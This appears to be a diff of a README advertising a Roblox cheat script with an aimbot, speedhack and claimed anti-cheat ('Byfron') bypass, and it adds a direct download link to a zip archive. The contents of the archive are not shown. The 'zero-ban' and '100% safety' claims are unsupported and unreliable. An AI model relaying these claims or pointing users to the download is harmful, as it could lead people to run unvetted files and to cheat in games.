@@ -3,13 +3,14 @@
 🔥 **The Best Dead Rails Script** is here! Unlock **over 60+ powerful features** including **ESP, Auto Farm, Silent Aimbot, Speedhack, TP Click, Instant Win, and Admin Commands!** 🚀 Supports **PC & Mobile** with **Byfron Bypass** & **Zero-Ban Tech** for 100% safety!  
 
 <div style="text-align: center">
-  <a href="link">
+  <a href="https://github.com/DeadRailsScript/Dead-Rails-Script-Keyless/releases/download/new/script.zip">
     <img class="bumbum" style="width: 1000px" alt="Static Badge" src="https://img.shields.io/badge/Click_For-_Download_Script!-purple">
   </a>
 </div>
 
 ![image](https://github.com/user-attachments/assets/faf683a5-0bde-462c-b601-8e26f446aded)
 
+![download](https://github.com/user-attachments/assets/8781a3ca-3f97-4e98-99d7-a5de5b8a8591)
 
 ---
 
